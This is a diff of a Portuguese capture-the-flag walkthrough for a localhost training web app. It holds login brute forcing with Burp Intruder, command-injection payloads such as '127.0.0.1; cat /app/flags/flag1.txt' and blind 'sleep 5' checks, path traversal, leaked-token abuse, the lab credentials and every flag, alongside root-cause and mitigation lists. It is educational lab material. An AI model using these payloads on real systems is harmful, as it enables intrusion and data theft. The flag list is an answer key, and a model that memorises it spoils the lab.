@@ -8,23 +8,17 @@ http://127.0.0.1:8090
 
 ## 0. Descoberta pre-login por debug disclosure
 
-Fluxo tecnico:
+Fluxo:
 
 1. Capture um `POST /api/auth/login`.
 2. Modifique `returnUrl` para `"'"`.
-3. Receba `HTTP 500` com erro controlado de redirect/parser.
-4. O stack trace expoe `/old/deployment-notes.txt` e `/backup/readme.txt`.
-5. `GET /old/deployment-notes.txt`.
-6. Usuario encontrado: `analyst`.
-7. Senha antiga incorreta: `analyst2022`.
-8. `GET /backup/readme.txt`.
-9. O backup aponta para `user-candidates.txt` e `password-candidates.txt`.
-10. `GET /backup/user-candidates.txt`.
-11. `GET /backup/password-candidates.txt`.
-12. A nota de deployment tambem menciona `access-review.txt`.
-13. `GET /old/access-review.txt`.
+3. Receba `HTTP 500` com stack trace controlado.
+4. O erro expoe `/old/deployment-notes.txt` e `/backup/readme.txt`.
+5. Leia as notas antigas, as listas candidatas e use Intruder.
+6. A combinacao valida e `analyst:analyst123`.
+7. `deployment-notes.txt` aponta para `access-review.txt`.
 
-Payload de erro:
+Payload:
 
 ```json
 {
@@ -35,109 +29,60 @@ Payload de erro:
 }
 ```
 
-Burp Intruder:
+Intruder:
 
-1. Capture um `POST /api/auth/login`.
-2. Marque o valor de `username` como primeira posicao.
-3. Marque o valor de `password` como segunda posicao.
-4. Use ataque `Cluster Bomb`.
-5. Carregue `user-candidates.txt` como Payload set 1.
-6. Carregue `password-candidates.txt` como Payload set 2.
-7. Identifique a resposta `200`, com tamanho diferente e mensagem `Login successful`.
+1. Payload set 1 no `username`.
+2. Payload set 2 no `password`.
+3. Ataque `Cluster Bomb`.
+4. `user-candidates.txt` no set 1.
+5. `password-candidates.txt` no set 2.
+6. Identificar a resposta `200`, maior e com `Login successful`.
 
-Corpo conceitual:
-
-```json
-{
-  "username": "§user§",
-  "password": "§password§",
-  "client": "web",
-  "returnUrl": "/dashboard.html"
-}
-```
-
-Credencial final:
+Flag:
 
 ```text
-analyst:analyst123
-```
-
-Flag pre-auth:
-
-```text
+GET /old/access-review.txt
 FLAG{pre_auth_debug_disclosure_lab3}
 ```
-
-Causa raiz:
-
-- debug error em producao;
-- stack trace/path disclosure;
-- parametro client-side nao validado adequadamente;
-- arquivos legados publicados no webroot;
-- backup publico com listas de usuarios e senhas candidatas;
-- falta de rotacao/remocao de credenciais.
-
-Mitigacao:
-
-- respostas de erro genericas;
-- desabilitar debug em producao;
-- validar `returnUrl` com allowlist;
-- nao expor caminhos internos;
-- remover arquivos sensiveis do webroot;
-- nunca publicar listas de usuarios ou senhas;
-- rotacionar credenciais expostas;
-- implementar rate limiting e lockout em login real.
 
 ## Payloads principais
 
 ```text
-target: 127.0.0.1; whoami
-target: 127.0.0.1; pwd
-target: 127.0.0.1; ls -la
-target: 127.0.0.1; ls -la /app
-target: 127.0.0.1; find /app -maxdepth 3 -type f 2>/dev/null
-target: 127.0.0.1; cat /app/flags/flag1.txt
-target: 127.0.0.1; sleep 5; #
-target: 127.0.0.1; cp /app/flags/flag_time.txt /app/public/reports/tcp-proof.txt; sleep 5; #
-target: localhost && cat /app/flags/flag2.txt
-file=../flags/flag4.txt
-archiveName: backup.tar.gz; cat /app/flags/root.txt
+returnUrl = '
+target = 127.0.0.1; whoami
+target = 127.0.0.1; pwd
+target = 127.0.0.1; ls -la
+target = 127.0.0.1; ls -la /app
+target = 127.0.0.1; ls -la /app/flags
+target = 127.0.0.1; cat /app/flags/flag1.txt
+tcp target = 127.0.0.1; sleep 5; #
+tcp target = 127.0.0.1; cp /app/flags/flag_time.txt /app/public/reports/tcp-proof.txt; sleep 5; #
+resolver target = internal-metadata
+file = ../flags/flag4.txt
+includeFile = data/backup-manifest.log
+includeFile = flags/root.txt
 ```
+
+Uma enumeracao mais agressiva como `find /app -maxdepth 3 -type f 2>/dev/null` tambem funciona na Command Injection com output, mas pode revelar artefatos de etapas futuras e por isso nao e o caminho didatico recomendado no walkthrough.
 
 ## Login
-
-Login com a credencial descoberta na etapa pre-login:
-
-```text
-analyst:analyst123
-```
-
-Exemplo:
 
 ```bash
 curl -s -c cookies.txt \
   -H "Content-Type: application/json" \
-  -d '{"username":"analyst","password":"analyst123"}' \
+  -d '{"username":"analyst","password":"analyst123","returnUrl":"/dashboard.html"}' \
   http://127.0.0.1:8090/api/auth/login
 ```
 
-## 1. Asset Check Command Injection
+## 1. Request Tampering e Command Injection com output
 
-Fluxo manual:
-
-1. No dashboard, clique em "Verificar" em qualquer ativo.
-2. Capture a requisicao no Burp.
-3. Envie para Repeater.
-4. Altere apenas `target`.
-5. Compare a resposta normal com a resposta adulterada.
-
-Rota real:
+Rota:
 
 ```text
 POST /api/assets/check
 ```
 
-Body normal enviado pela UI:
+Body normal:
 
 ```json
 {
@@ -147,12 +92,7 @@ Body normal enviado pela UI:
 }
 ```
 
-Esse endpoint possui dois modos vulneraveis:
-
-- `checkType: "icmp"` usa ping, retorna output e permite demonstrar Command Injection com retorno visivel.
-- `checkType: "tcp"` usa uma verificacao TCP, retorna apenas metadados com `durationMs` e serve para Blind/Time-Based Command Injection.
-
-A falha esta no backend confiar em `target` e, no modo TCP, tambem em `port`, enviados pelo cliente. Nao e uma vulnerabilidade de um card especifico do dashboard; qualquer card que use a mesma feature de check pode ser explorado apos alteracao da request no Burp.
+O backend concatena `target` no comando de ping. A UI nao permite editar `target`, mas o Burp permite.
 
 Prova de execucao:
 
@@ -164,43 +104,16 @@ Prova de execucao:
 }
 ```
 
-Enumeracao controlada:
+Enumeracao:
 
-```json
-{
-  "assetId": "gw-01",
-  "checkType": "icmp",
-  "target": "127.0.0.1; pwd"
-}
+```text
+127.0.0.1; pwd
+127.0.0.1; ls -la
+127.0.0.1; ls -la /app
+127.0.0.1; ls -la /app/flags
 ```
 
-```json
-{
-  "assetId": "gw-01",
-  "checkType": "icmp",
-  "target": "127.0.0.1; ls -la"
-}
-```
-
-```json
-{
-  "assetId": "gw-01",
-  "checkType": "icmp",
-  "target": "127.0.0.1; ls -la /app"
-}
-```
-
-```json
-{
-  "assetId": "gw-01",
-  "checkType": "icmp",
-  "target": "127.0.0.1; find /app -maxdepth 3 -type f 2>/dev/null"
-}
-```
-
-Esse caminho confirma execucao, mostra o contexto do processo e encontra arquivos de interesse sem comandos destrutivos.
-
-Leitura da flag encontrada:
+Flag:
 
 ```json
 {
@@ -210,124 +123,74 @@ Leitura da flag encontrada:
 }
 ```
 
-Curl opcional:
-
-```bash
-curl -s -b cookies.txt \
-  -H "Content-Type: application/json" \
-  -d '{"assetId":"gw-01","checkType":"icmp","target":"127.0.0.1; cat /app/flags/flag1.txt"}' \
-  http://127.0.0.1:8090/api/assets/check
-```
-
-Flag:
-
 ```text
 FLAG{command_injection_ping_lab3}
 ```
 
-Causa raiz: o backend confia em `target` enviado pelo cliente e monta:
+## 2. Blind/Time-Based Command Injection em agente separado
 
-```text
-ping -c 2 ${target}
+Descoberta:
+
+```js
+const legacyAgentTcpProbeEndpoint = "/api/agents/tcp-probe";
 ```
-
-Mitigacao:
-
-- nao confiar em `target` vindo do cliente;
-- recalcular o hostname no servidor a partir de `assetId`;
-- nao usar `exec` com concatenacao;
-- usar `execFile` ou `spawn` com argumentos separados;
-- validar allowlist de host/IP;
-- executar a aplicacao com privilegios minimos.
-
-## 1.1. Blind/Time-Based Command Injection no TCP Check
-
-O mesmo endpoint aceita um modo TCP legado. Ele deve ser montado manualmente no Burp Repeater, porque a UI continua enviando apenas o check visivel. Diferente do modo `icmp`, esse fluxo nao retorna stdout/stderr: o sinal de exploracao fica nos metadados e no aumento de `durationMs`.
 
 Rota:
 
 ```text
-POST /api/assets/check
+POST /api/agents/tcp-probe
 ```
 
-Body normal TCP:
+Body normal:
 
 ```json
 {
-  "assetId": "gw-01",
-  "checkType": "tcp",
   "target": "127.0.0.1",
   "port": "80"
 }
 ```
 
-Body time-based:
+Payload por tempo:
 
 ```json
 {
-  "assetId": "gw-01",
-  "checkType": "tcp",
   "target": "127.0.0.1; sleep 5; #",
   "port": "80"
 }
 ```
 
-Body com efeito colateral observavel:
+A resposta nao retorna stdout/stderr. Ela contem apenas:
+
+```text
+ok, status, target, port, durationMs
+```
+
+Payload com efeito colateral seguro:
 
 ```json
 {
-  "assetId": "gw-01",
-  "checkType": "tcp",
   "target": "127.0.0.1; cp /app/flags/flag_time.txt /app/public/reports/tcp-proof.txt; sleep 5; #",
   "port": "80"
 }
 ```
 
-Payload:
-
-```text
-target = 127.0.0.1; sleep 5; #
-```
-
-A resposta TCP nao retorna stdout/stderr. Ela retorna metadados, incluindo `durationMs`. Quando o payload com `sleep 5` faz a resposta demorar aproximadamente 5 segundos a mais que a requisicao controle, isso confirma blind command injection por canal de tempo.
-
-Para obter a flag por efeito colateral seguro, use o payload com `cp` acima e depois acesse:
+Depois:
 
 ```text
 GET /reports/tcp-proof.txt
 ```
 
-Flag:
-
 ```text
 FLAG{blind_time_based_command_injection_lab3}
 ```
 
-Exemplo curl opcional:
+## 3. Hidden endpoint discovery e metadata disclosure
 
-```bash
-curl -s -b cookies.txt \
-  -H "Content-Type: application/json" \
-  -d '{"assetId":"gw-01","checkType":"tcp","target":"127.0.0.1; sleep 5; #","port":"80"}' \
-  http://127.0.0.1:8090/api/assets/check
-```
-
-Mitigacao:
-
-- nao usar `exec` com concatenacao;
-- usar `execFile` ou `spawn` com argumentos separados;
-- aplicar allowlist estrita de `checkType`;
-- validar `target` como IP/hostname permitido;
-- validar `port` como numero entre 1 e 65535;
-- nao confiar em campos tecnicos enviados pelo cliente;
-- manter timeout e isolamento do processo.
-
-## 2. Resolver Legado Escondido
-
-Descoberta no JavaScript:
+Descoberta no JS:
 
 ```js
-const legacyAssetResolver = "/api/assets/resolve";
+const legacyResolverEndpoint = "/api/assets/resolve";
+const legacyResolverPayloadShape = { target: "hostname" };
 ```
 
 Rota:
@@ -336,181 +199,107 @@ Rota:
 POST /api/assets/resolve
 ```
 
-No Burp Repeater, monte uma requisicao manual usando o mesmo cookie `session` recebido no login. Esse endpoint nao reaproveita o body de `/api/assets/check`; ele espera uma requisicao minima propria:
-
-```http
-POST /api/assets/resolve
-Content-Type: application/json
-Cookie: session=...
-```
-
-Entrada normal:
+Body normal:
 
 ```json
 {
-  "target": "localhost"
+  "target": "dns01.local"
 }
 ```
 
-Filtro bloqueado:
+Resposta normal:
 
 ```json
 {
-  "target": "localhost; whoami"
+  "ok": true,
+  "target": "dns01.local",
+  "resolved": "10.10.0.53",
+  "metadata": {
+    "owner": "netops",
+    "environment": "internal",
+    "resolver": "legacy"
+  }
 }
 ```
 
-Bypass:
-
-```json
-{
-  "target": "localhost && id"
-}
-```
-
-Flag:
-
-```json
-{
-  "target": "localhost && cat /app/flags/flag2.txt"
-}
-```
-
-Curl opcional:
-
-```bash
-curl -s -b cookies.txt \
-  -H "Content-Type: application/json" \
-  -d '{"target":"localhost && cat /app/flags/flag2.txt"}' \
-  http://127.0.0.1:8090/api/assets/resolve
-```
-
-Flag:
+`app.log` entrega a pista:
 
 ```text
-FLAG{weak_filter_bypass_lab3}
+[debug] legacy resolver still accepts internal metadata target for support checks
 ```
 
-Causa raiz: blacklist fraca bloqueia apenas `;`, enquanto o backend executa:
+Body de flag:
 
-```text
-nslookup ${target}
+```json
+{
+  "target": "internal-metadata"
+}
 ```
 
-Mitigacao:
+Resposta:
 
-- bloquear caracteres isolados nao e suficiente;
-- usar `execFile("nslookup", [target])`;
-- validar allowlist;
-- remover shell da operacao.
-
-## 3. Support Diagnostics e Logs
-
-Descoberta:
-
-```html
-<!-- support diagnostics moved to /support.html after incident NT-2026-041 -->
+```json
+{
+  "ok": true,
+  "target": "internal-metadata",
+  "metadata": {
+    "note": "legacy resolver metadata should not be exposed",
+    "flag": "FLAG{hidden_resolver_metadata_disclosure_lab3}"
+  }
+}
 ```
 
-Pagina:
+## 4. Support logs e Path Traversal
 
-```text
-/support.html
-```
-
-Rota:
+`support.html` chama:
 
 ```text
 GET /api/support/log?file=app.log
 ```
 
-Pistas em `app.log`:
+`app.log` aponta para:
 
 ```text
-support health endpoint moved to /api/internal/health
-header expected: X-Support-Token
-support token prefix: netaudit
-support token middle: debug
-support token suffix: 2026
-diagnostics and backup routes only exposed by internal healthcheck
-archived incident evidence moved outside data directory
-legacy resolver endpoint kept for support troubleshooting
+[debug] archived incident review details moved to audit.log
 ```
 
-Token:
+`audit.log` contem:
 
 ```text
-netaudit-debug-2026
+[review] incident evidence moved outside data directory
+[review] evidence relative hint: flags/flag4.txt
+[review] log viewer base directory: /app/data
 ```
 
-Cadeia de montagem:
-
-```text
-support token prefix: netaudit
-support token middle: debug
-support token suffix: 2026
-```
-
-Essas tres partes formam `netaudit-debug-2026`, que deve ser enviado no header `X-Support-Token`.
-
-Causa raiz: logs operacionais expostos vazam rotas internas, header e partes de segredo.
-
-Mitigacao:
-
-- nao vazar tokens em logs;
-- mascarar dados sensiveis;
-- restringir logs por autorizacao;
-- rotacionar segredos vazados.
-
-## 4. Path Traversal
-
-O campo `Log file` dispara:
-
-```text
-GET /api/support/log?file=app.log
-```
-
-O endpoint vulneravel usa `path.join("/app/data", file)` sem validar o caminho final. Como o `app.log` informa que a evidencia foi movida para fora do data directory, usar `../flags/flag4.txt` produz `/app/data/../flags/flag4.txt`, que resolve para `/app/flags/flag4.txt`.
-
-Payload:
+Como a base e `/app/data`, o payload:
 
 ```text
 file=../flags/flag4.txt
 ```
 
-Flag:
+resolve para `/app/flags/flag4.txt`.
 
-```bash
-curl -s -b cookies.txt \
-  "http://127.0.0.1:8090/api/support/log?file=../flags/flag4.txt"
-```
+Flag:
 
 ```text
 FLAG{path_traversal_log_viewer_lab3}
 ```
 
-Mitigacao:
+## 5. Internal health, token vazado e diagnostics
 
-- usar allowlist de arquivos;
-- normalizar com `path.resolve`;
-- verificar se o caminho final permanece no diretorio permitido;
-- nao aceitar caminhos arbitrarios do usuario.
-
-## 5. Internal Health
-
-Rota:
+Token montado a partir do log:
 
 ```text
-GET /api/internal/health
+netaudit-debug-2026
 ```
 
-Header:
+Sem header:
 
 ```text
-X-Support-Token: netaudit-debug-2026
+GET /api/internal/health -> 403
 ```
 
-Curl:
+Com header:
 
 ```bash
 curl -s \
@@ -518,7 +307,7 @@ curl -s \
   http://127.0.0.1:8090/api/internal/health
 ```
 
-Resposta revela:
+Resposta:
 
 ```json
 {
@@ -527,20 +316,12 @@ Resposta revela:
   "environment": "production",
   "diagnosticEndpoint": "/api/internal/diagnostics",
   "backupEndpoint": "/api/internal/backup",
-  "method": "POST",
-  "requiredParameter": "archiveName"
+  "backupMethod": "POST",
+  "requiredParameter": "includeFile"
 }
 ```
 
-Nao retorna flag diretamente. O ponto importante e que o JSON revela `diagnosticEndpoint`, `backupEndpoint`, `method: "POST"` e `requiredParameter: "archiveName"`.
-
-Rota de diagnostics:
-
-```text
-GET /api/internal/diagnostics
-```
-
-Curl:
+Diagnostics:
 
 ```bash
 curl -s \
@@ -553,18 +334,12 @@ Resposta:
 ```json
 {
   "status": "diagnostics_ready",
-  "flag": "FLAG{internal_diagnostics_token_abuse_lab3}"
+  "flag": "FLAG{internal_diagnostics_token_abuse_lab3}",
+  "backupManifest": "/app/data/backup-manifest.log"
 }
 ```
 
-Mitigacao:
-
-- nao usar token estatico de debug;
-- remover endpoints internos em producao;
-- exigir autenticacao e autorizacao reais;
-- segregar rotas administrativas.
-
-## 6. Backup Command Injection
+## 6. Backup interno com Arbitrary File Read
 
 Rota:
 
@@ -572,60 +347,66 @@ Rota:
 POST /api/internal/backup
 ```
 
-Header:
-
-```text
-X-Support-Token: netaudit-debug-2026
-```
-
-Como o health interno informa `method: "POST"`, acessar `/api/internal/backup` via `GET` deve falhar e isso e esperado. A requisicao correta precisa ser `POST` com JSON.
-
 Body normal:
 
 ```json
 {
-  "archiveName": "backup.tar.gz"
+  "includeFile": "data/app.log"
 }
 ```
 
-No Burp Repeater, crie a requisicao manualmente a partir dos metadados do health interno e mantenha o header de suporte.
-
-Flag final:
+Manifesto indicado por diagnostics:
 
 ```json
 {
-  "archiveName": "backup.tar.gz; cat /app/flags/root.txt"
+  "includeFile": "data/backup-manifest.log"
 }
 ```
 
-Curl opcional:
+Conteudo importante:
 
-```bash
-curl -s -X POST http://127.0.0.1:8090/api/internal/backup \
-  -H "Content-Type: application/json" \
-  -H "X-Support-Token: netaudit-debug-2026" \
-  -d '{"archiveName":"backup.tar.gz; cat /app/flags/root.txt"}'
+```text
+[backup] export service accepts includeFile
+[backup] approved examples: data/app.log, data/audit.log
+[backup] final proof file: flags/root.txt
+```
+
+Leitura arbitraria final:
+
+```json
+{
+  "includeFile": "flags/root.txt"
+}
 ```
 
 Flag:
 
 ```text
-FLAG{admin_backup_command_injection_lab3}
+FLAG{admin_backup_arbitrary_file_read_lab3}
 ```
 
-Causa raiz:
+## Causas raiz e mitigacoes
 
-```text
-tar -czf /tmp/${archiveName} /app/data
-```
+- stack trace detalhado em producao;
+- artefatos legados publicados no webroot;
+- credenciais descobriveis por exposicao operacional;
+- concatenacao em shell em endpoints de probe;
+- metadata interna exposta por endpoint legado;
+- viewer de logs com path traversal;
+- token interno vazado em logs;
+- backup administrativo com arbitrary file read.
 
-Mitigacao:
+Mitigacoes:
 
-- gerar nome de arquivo no servidor;
-- validar por allowlist;
-- usar `execFile` ou `spawn`;
-- separar permissoes do processo;
-- nao manter segredos legiveis pelo processo web.
+- respostas de erro genericas;
+- segredos fora do webroot;
+- rotacao de credenciais expostas;
+- `execFile` ou `spawn` com argumentos separados;
+- allowlists estritas de target e port;
+- nao expor metadata sensivel;
+- validar caminhos resolvidos contra base permitida;
+- remover tokens estaticos vazados em logs;
+- aplicar autorizacao real em endpoints internos.
 
 ## Lista de flags
 
@@ -633,8 +414,8 @@ Mitigacao:
 FLAG{pre_auth_debug_disclosure_lab3}
 FLAG{command_injection_ping_lab3}
 FLAG{blind_time_based_command_injection_lab3}
-FLAG{weak_filter_bypass_lab3}
+FLAG{hidden_resolver_metadata_disclosure_lab3}
 FLAG{path_traversal_log_viewer_lab3}
 FLAG{internal_diagnostics_token_abuse_lab3}
-FLAG{admin_backup_command_injection_lab3}
+FLAG{admin_backup_arbitrary_file_read_lab3}
 ```
